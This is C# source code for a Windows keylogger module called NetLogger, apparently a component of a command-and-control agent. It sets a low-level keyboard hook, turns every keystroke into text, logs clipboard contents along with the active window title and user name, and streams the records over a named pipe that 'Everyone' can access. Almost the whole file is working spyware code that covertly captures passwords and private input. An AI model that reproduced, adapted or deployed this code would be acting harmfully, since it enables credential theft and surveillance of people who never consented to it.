using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Text;
using System.Linq;
using static NetLogger.Native;
using System.Security.Principal;
using IPC;
using System.Net.Configuration;
using System.Runtime.Serialization.Formatters.Binary;
using System.IO.Pipes;
using System.Threading;
using System.Security.AccessControl;

namespace NetLogger
{
    public class Program
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static string lastTitle = "";
        private static Mutex msgMutex = new Mutex();
        public static KeystrokeMessage msg = new KeystrokeMessage();
        private static BinaryFormatter bf;
        private static NamedPipeServerStream pipeServer;
        //private static bool exit = false; 

        public static void CreateNamedPipeServer(string pipeName)
        {
            PipeSecurity pipeSecurityDescriptor = new PipeSecurity();
            PipeAccessRule everyoneAllowedRule = new PipeAccessRule("Everyone", PipeAccessRights.ReadWrite, AccessControlType.Allow);
            PipeAccessRule networkDenyRule = new PipeAccessRule("Network", PipeAccessRights.ReadWrite, AccessControlType.Deny);       // This should only be used locally, so lets limit the scope
            pipeSecurityDescriptor.AddAccessRule(everyoneAllowedRule);
            //pipeSecurityDescriptor.AddAccessRule(networkDenyRule);

            // Gotta be careful with the buffer sizes. There's a max limit on how much data you can write to a pipe in one sweep. IIRC it's ~55,000, but I dunno for sure.
            pipeServer = new NamedPipeServerStream(pipeName, PipeDirection.InOut, 10, PipeTransmissionMode.Message, PipeOptions.Asynchronous, 32768, 32768, pipeSecurityDescriptor);
        }

        public static void WaitForKillAsync()
        {
            try
            {
                var killMessage = (KillLoggerMessage)bf.Deserialize(pipeServer);
                Application.Exit();
                pipeServer.Disconnect();
                pipeServer.Close();
            }
            catch { }
        }

        [STAThread]
        public static void InitializeNamedPipeServer(string pipeName)
        {
#if DEBUG
            pipeName = "DJHTEST";
#endif
            CreateNamedPipeServer(pipeName);
            bf = new BinaryFormatter();
            bf.Binder = new IPC.KeystrokeMessageBinder();

            if (pipeServer == null)
                return;
            try
            {
                // We shouldn't need to go async here since we'll only have one client, the agent core, and it'll maintain the connection to the named pipe until the job is done
                pipeServer.WaitForConnection();

            }
            catch (Exception e)
            {
                // Can't really return this error to the agent, so we're just going to have to abort everything
                // Console.WriteLine("ERROR: Could not read assembly from named pipe. " + e);
                if (pipeServer.IsConnected)
                    try
                    {
                        pipeServer.Close();
                    }
                    catch { };
                return;
            }
            Thread t = new Thread(() => BootClipboard());
            t.ApartmentState = ApartmentState.STA;
            t.Start();
            _hookID = SetHook(_proc);
            try
            {
                Thread killThread = new Thread(() => WaitForKillAsync());
                killThread.ApartmentState = ApartmentState.STA;
                killThread.Start();
                Application.Run();
            }
            catch { }
            UnhookWindowsHookEx(_hookID);
        }


        [STAThread]
        public static void Main(string[] args)
        {
            //InitializeNamedPipeServer("DJHTEST");
        }

        private static void LogMessage(string title, string text)
        {
            //msgMutex.WaitOne();
            if (title != lastTitle)
            {
                FlushMessage();
                msg = new KeystrokeMessage()
                {
                    User = WindowsIdentity.GetCurrent().Name,
                    WindowTitle = title,
                    Keystrokes = text
                };
                lastTitle = title;
            }
            else
            {
                msg.Keystrokes += text;
            }
            //msgMutex.ReleaseMutex();
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static void FlushMessage()
        {

            try
            {
                bf.Serialize(pipeServer, msg);
                pipeServer.Flush();
            }
            catch { }
        }

        private static void BootClipboard()
        {
            Application.Run(new NotificationForm());
        }

        private static IntPtr HookCallback(Int32 code, IntPtr wParam, IntPtr lParam)
        {
            try
            {
                Int32 msgType = wParam.ToInt32();
                Int32 vKey;
                string key = "";
                if (code >= 0 && lParam != IntPtr.Zero)
                {
                    bool shift = false;
                    IntPtr hWindow = GetForegroundWindow();
                    short shiftState = GetAsyncKeyState(Keys.ShiftKey);
                    if ((shiftState & 0x8000) == 0x8000)
                    {
                        shift = true;
                    }
                    var caps = Console.CapsLock;

                    // read virtual key from buffer
                    vKey = Marshal.ReadInt32(lParam);
                    if (msgType == 0x101)
                    {
                        switch ((Keys)vKey)
                        {
                            case Keys.F1:
                                key = "<F1>";
                                break;
                            case Keys.F2:
                                key = "<F2>";
                                break;
                            case Keys.F3:
                                key = "<F3>";
                                break;
                            case Keys.F4:
                                key = "<F4>";
                                break;
                            case Keys.F5:
                                key = "<F5>";
                                break;
                            case Keys.F6:
                                key = "<F6>";
                                break;
                            case Keys.F7:
                                key = "<F7>";
                                break;
                            case Keys.F8:
                                key = "<F8>";
                                break;
                            case Keys.F9:
                                key = "<F9>";
                                break;
                            case Keys.F10:
                                key = "<F10>";
                                break;
                            case Keys.F11:
                                key = "<F11>";
                                break;
                            case Keys.F12:
                                key = "<F12>";
                                break;

                            //case Keys.Snapshot:
                            //    key = "<Print Screen>";
                            //    break;
                            //case Keys.Scroll:
                            //    key = "<Scroll Lock>";
                            //    break;
                            //case Keys.Pause:
                            //    key = "<Pause/Break>";
                            //    break;
                            case Keys.Insert:
                                key = "<Insert>";
                                break;
                            //case Keys.Home:
                            //    key = "<Home>";
                            //    break;
                            case Keys.Delete:
                                key = "<Delete>";
                                break;
                            //case Keys.End:
                            //    key = "<End>";
                            //    break;
                            //case Keys.Prior:
                            //    key = "<Page Up>";
                            //    break;
                            //case Keys.Next:
                            //    key = "<Page Down>";
                            //    break;
                            //case Keys.Escape:
                            //    key = "<Esc>";
                            //    break;
                            //case Keys.NumLock:
                            //    key = "<Num Lock>";
                            //    break;
                            //case Keys.Capital:
                            //    key = "<Caps Lock>";
                            //    break;
                            case Keys.Tab:
                                key = "<Tab>";
                                break;
                            case Keys.Back:
                                key = "<Backspace>";
                                break;
                            case Keys.Enter:
                                key = "<Enter>";
                                break;
                            case Keys.Space:
                                key = "<Space Bar>";
                                break;
                            case Keys.Left:
                                key = "<Left>";
                                break;
                            case Keys.Up:
                                key = "<Up>";
                                break;
                            case Keys.Right:
                                key = "<Right>";
                                break;
                            case Keys.Down:
                                key = "<Down>";
                                break;
                            case Keys.LMenu:
                                key = "<Alt>";
                                break;
                            case Keys.RMenu:
                                key = "<Alt>";
                                break;
                            case Keys.LWin:
                                key = "<Windows Key>";
                                break;
                            case Keys.RWin:
                                key = "<Windows Key>";
                                break;
                            //case Keys.LShiftKey:
                            //    key = "<Shift>";
                            //    break;
                            //case Keys.RShiftKey:
                            //    key = "<Shift>";
                            //    break;
                            case Keys.LControlKey:
                                key = "<Ctrl>";
                                break;
                            case Keys.RControlKey:
                                key = "<Ctrl>";
                                break;
                        }
                    } else if (msgType == 0x100 || msgType == 0x104)
                    {
                        // Parse key
                        if (vKey > 64 && vKey < 91)
                        {
                            if (shift | caps)
                            {
                                key = ((Keys)vKey).ToString();
                            }
                            else
                            {
                                key = ((Keys)vKey).ToString().ToLower();
                            }
                        }
                        else if (vKey >= 96 && vKey <= 111)
                        {
                            switch (vKey)
                            {
                                case 96:
                                    key = "0";
                                    break;
                                case 97:
                                    key = "1";
                                    break;
                                case 98:
                                    key = "2";
                                    break;
                                case 99:
                                    key = "3";
                                    break;
                                case 100:
                                    key = "4";
                                    break;
                                case 101:
                                    key = "5";
                                    break;
                                case 102:
                                    key = "6";
                                    break;
                                case 103:
                                    key = "7";
                                    break;
                                case 104:
                                    key = "8";
                                    break;
                                case 105:
                                    key = "9";
                                    break;
                                case 106:
                                    key = "*";
                                    break;
                                case 107:
                                    key = "+";
                                    break;
                                case 108:
                                    key = "|";
                                    break;
                                case 109:
                                    key = "-";
                                    break;
                                case 110:
                                    key = ".";
                                    break;
                                case 111:
                                    key = "/";
                                    break;
                            }
                        }
                        else if ((vKey >= 48 && vKey <= 57) || (vKey >= 186 && vKey <= 192))
                        {
                            if (shift)
                            {
                                switch (vKey)
                                {
                                    case 48:
                                        key = ")";
                                        break;
                                    case 49:
                                        key = "!";
                                        break;
                                    case 50:
                                        key = "@";
                                        break;
                                    case 51:
                                        key = "#";
                                        break;
                                    case 52:
                                        key = "$";
                                        break;
                                    case 53:
                                        key = "%";
                                        break;
                                    case 54:
                                        key = "^";
                                        break;
                                    case 55:
                                        key = "&";
                                        break;
                                    case 56:
                                        key = "*";
                                        break;
                                    case 57:
                                        key = "(";
                                        break;
                                    case 186:
                                        key = ":";
                                        break;
                                    case 187:
                                        key = "+";
                                        break;
                                    case 188:
                                        key = "<";
                                        break;
                                    case 189:
                                        key = "_";
                                        break;
                                    case 190:
                                        key = ">";
                                        break;
                                    case 191:
                                        key = "?";
                                        break;
                                    case 192:
                                        key = "~";
                                        break;
                                    case 219:
                                        key = "{";
                                        break;
                                    case 220:
                                        key = "|";
                                        break;
                                    case 221:
                                        key = "}";
                                        break;
                                    case 222:
                                        key = "<Double Quotes>";
                                        break;
                                }
                            }
                            else
                            {
                                switch (vKey)
                                {
                                    case 48:
                                        key = "0";
                                        break;
                                    case 49:
                                        key = "1";
                                        break;
                                    case 50:
                                        key = "2";
                                        break;
                                    case 51:
                                        key = "3";
                                        break;
                                    case 52:
                                        key = "4";
                                        break;
                                    case 53:
                                        key = "5";
                                        break;
                                    case 54:
                                        key = "6";
                                        break;
                                    case 55:
                                        key = "7";
                                        break;
                                    case 56:
                                        key = "8";
                                        break;
                                    case 57:
                                        key = "9";
                                        break;
                                    case 186:
                                        key = ";";
                                        break;
                                    case 187:
                                        key = "=";
                                        break;
                                    case 188:
                                        key = ",";
                                        break;
                                    case 189:
                                        key = "-";
                                        break;
                                    case 190:
                                        key = ".";
                                        break;
                                    case 191:
                                        key = "/";
                                        break;
                                    case 192:
                                        key = "`";
                                        break;
                                    case 219:
                                        key = "[";
                                        break;
                                    case 220:
                                        key = "\\";
                                        break;
                                    case 221:
                                        key = "]";
                                        break;
                                    case 222:
                                        key = "<Single Quote>";
                                        break;
                                }
                            }
                        }
                        else
                        {
                            switch ((Keys)vKey)
                            {
                                case Keys.F1:
                                    key = "<F1>";
                                    break;
                                case Keys.F2:
                                    key = "<F2>";
                                    break;
                                case Keys.F3:
                                    key = "<F3>";
                                    break;
                                case Keys.F4:
                                    key = "<F4>";
                                    break;
                                case Keys.F5:
                                    key = "<F5>";
                                    break;
                                case Keys.F6:
                                    key = "<F6>";
                                    break;
                                case Keys.F7:
                                    key = "<F7>";
                                    break;
                                case Keys.F8:
                                    key = "<F8>";
                                    break;
                                case Keys.F9:
                                    key = "<F9>";
                                    break;
                                case Keys.F10:
                                    key = "<F10>";
                                    break;
                                case Keys.F11:
                                    key = "<F11>";
                                    break;
                                case Keys.F12:
                                    key = "<F12>";
                                    break;

                                //case Keys.Snapshot:
                                //    key = "<Print Screen>";
                                //    break;
                                //case Keys.Scroll:
                                //    key = "<Scroll Lock>";
                                //    break;
                                //case Keys.Pause:
                                //    key = "<Pause/Break>";
                                //    break;
                                case Keys.Insert:
                                    key = "<Insert>";
                                    break;
                                //case Keys.Home:
                                //    key = "<Home>";
                                //    break;
                                case Keys.Delete:
                                    key = "<Delete>";
                                    break;
                                //case Keys.End:
                                //    key = "<End>";
                                //    break;
                                //case Keys.Prior:
                                //    key = "<Page Up>";
                                //    break;
                                //case Keys.Next:
                                //    key = "<Page Down>";
                                //    break;
                                //case Keys.Escape:
                                //    key = "<Esc>";
                                //    break;
                                //case Keys.NumLock:
                                //    key = "<Num Lock>";
                                //    break;
                                //case Keys.Capital:
                                //    key = "<Caps Lock>";
                                //    break;
                                case Keys.Tab:
                                    key = "<Tab>";
                                    break;
                                case Keys.Back:
                                    key = "<Backspace>";
                                    break;
                                case Keys.Enter:
                                    key = "<Enter>";
                                    break;
                                case Keys.Space:
                                    key = "<Space Bar>";
                                    break;
                                case Keys.Left:
                                    key = "<Left>";
                                    break;
                                case Keys.Up:
                                    key = "<Up>";
                                    break;
                                case Keys.Right:
                                    key = "<Right>";
                                    break;
                                case Keys.Down:
                                    key = "<Down>";
                                    break;
                                case Keys.LMenu:
                                    key = "<Alt>";
                                    break;
                                case Keys.RMenu:
                                    key = "<Alt>";
                                    break;
                                case Keys.LWin:
                                    key = "<Windows Key>";
                                    break;
                                case Keys.RWin:
                                    key = "<Windows Key>";
                                    break;
                                //case Keys.LShiftKey:
                                //    key = "<Shift>";
                                //    break;
                                //case Keys.RShiftKey:
                                //    key = "<Shift>";
                                //    break;
                                case Keys.LControlKey:
                                    key = "<Ctrl>";
                                    break;
                                case Keys.RControlKey:
                                    key = "<Ctrl>";
                                    break;
                            }
                        }
                    }
                    if (!string.IsNullOrEmpty(key))
                    {
                        StringBuilder title = new StringBuilder(256);
                        if (hWindow != IntPtr.Zero)
                            GetWindowText(hWindow, title, title.Capacity);
                        LogMessage(title.ToString(), key);
                    }
                }
            }
            catch (Exception ex)
            {
                //Console.WriteLine("[X] Error in CallbackFunction: {0}", ex.Message);
                //Console.WriteLine("[X] StackTrace: {0}", ex.StackTrace);
            }
            return CallNextHookEx(_hookID, code, wParam, lParam);
        }

        public class NotificationForm : Form
        {

            public NotificationForm()
            {
                //Turn the child window into a message-only window (refer to Microsoft docs)
                SetParent(Handle, HWND_MESSAGE);
                //Place window in the system-maintained clipboard format listener list
                AddClipboardFormatListener(Handle);
            }

            protected override void WndProc(ref Message m)
            {
                try
                {
                    //Listen for operating system messages
                    if (m.Msg == WM_CLIPBOARDUPDATE)
                    {

                        //Write to stdout active window
                        IntPtr active_window = GetForegroundWindow();
                        if (active_window != IntPtr.Zero && active_window != null)
                        {
                            int length = GetWindowTextLength(active_window);
                            StringBuilder sb = new StringBuilder(length + 1);
                            GetWindowText(active_window, sb, sb.Capacity);
                            string clipboardMessage = "";
                            try
                            {
                                clipboardMessage = $"[ctrl-C] Clipboard Copied: {Clipboard.GetText()}[/ctrl-C]";
                            }
                            catch (Exception ex)
                            {
                                clipboardMessage = "[ERROR]Couldn't get text from clipboard.[/ERROR]";
                            }
                            LogMessage(sb.ToString(), clipboardMessage);
                        }
                    }
                    //Called for any unhandled messages
                    base.WndProc(ref m);
                }
                catch (Exception ex)
                {
                    //Console.WriteLine("[X] Error in WndProc: {0}", ex.Message);
                    //Console.WriteLine("[X] StackTrace: {0}", ex.StackTrace);
                }
            }
        }

    }

}
